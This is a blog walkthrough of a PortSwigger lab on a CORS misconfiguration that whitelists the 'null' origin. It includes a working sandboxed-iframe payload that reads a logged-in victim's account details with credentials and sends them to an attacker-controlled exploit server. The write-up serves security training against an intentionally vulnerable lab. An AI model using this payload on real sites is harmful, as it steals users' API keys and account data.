---
title: PortSwigger Walkthrough - CORS vulnerability with trusted null origin
date: 2026-08-25 20:00:00 +0200
categories: [Walkthrough, PortSwigger]
tags: [walkthrough, portswigger, bscp, cors]
author: diego
description: Walkthrough of PortSwigger's 'CORS vulnerability with trusted null origin' lab.
image:
  path: /assets/img/posts/portswigger/portswigger.png
  alt: PortSwigger Web Security Academy
---

> To browse all labs in this series, visit the [full PortSwigger series](/categories/portswigger/).
{: .prompt-info }

> All testing shown in this series is performed against PortSwigger Academy's intentionally vulnerable labs.  
> Do not apply these techniques to systems you do not own or have explicit written permission to test.
{: .prompt-warning }

## What's this?
The `Origin` header spec allows for a literal `null` value, which browsers send in a handful of edge cases: cross-origin redirects, requests generated from serialized data, `file:` protocol requests, and sandboxed iframes without the `allow-same-origin` flag. Some CORS configs explicitly whitelist `null` as a "safe" fallback. It isn't. If a browser can be made to send `Origin: null` on demand (and a sandboxed iframe makes that trivial), an attacker can trigger it from anywhere.

## Objective
This app trusts the literal `null` origin in its CORS config. Same goal as before: steal the administrator's API key via the exploit server. Own account: `wiener:peter`.

> [PortSwigger's lab link](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
{: .prompt-info }

## Walkthrough
Same starting point: log in, grab `GET /accountDetails`, and confirm `Access-Control-Allow-Credentials: true` is present. Send it to Repeater and try `Origin: https://evil-site.com` first, nothing reflected this time, so it's not the same simple case as the previous lab.

Try `Origin: null` instead:

![The literal null origin gets accepted](/assets/img/posts/portswigger/cors/03-null-origin.png)

There it is. Now we just need a page that makes the victim's browser send that exact `null` origin. A sandboxed iframe without `allow-same-origin` does exactly that. On the exploit server:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-EXPLOIT-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

Deliver it, check the access log, and the administrator's API key shows up. Submit it. Lab solved.

![Lab solved confirmation](/assets/img/posts/portswigger/cors/04-lab-solved.png)

Whitelisting `null` always feels like the "safe, restrictive" option, but it's actually one of the easiest origins to forge on demand.

<br><br>
> Wanna talk? Contact me here!  
> <a href="javascript:void(0);" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" onclick="navigator.clipboard.writeText('diegofdlg@gmail.com');alert('Mail copied to the clipboard!')"><i class="fa-solid fa-envelope"></i></a>
> <a href="https://www.linkedin.com/in/diego-fidalgo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-linkedin"></i></a>
> <a href="https://x.com/0x_ch3ngo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-x-twitter"></i></a>
> <a href="https://discord.com/users/149616662537043969" style="font-size:1.2rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-discord"></i></a>
{: .prompt-tip }
